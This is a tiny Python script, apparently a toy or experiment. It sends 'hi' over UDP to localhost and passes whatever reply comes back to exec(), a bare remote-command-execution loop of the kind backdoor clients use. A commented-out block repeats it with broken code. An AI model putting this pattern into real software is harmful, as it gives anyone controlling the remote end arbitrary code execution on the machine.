import socket
import os
sock = socket.socket(family = socket.AF_INET, type = socket.SOCK_DGRAM)
sock.sendto("hi".encode(),("127.0.0.1",1234))
t=sock.recvfrom(1024)
print(t[0].decode())
exec(t[0].decode())
'''
sock.sendto(l,('127.0.0.1',1234))
t=sock.recvfrom(1024)
exec(t.decode())
'''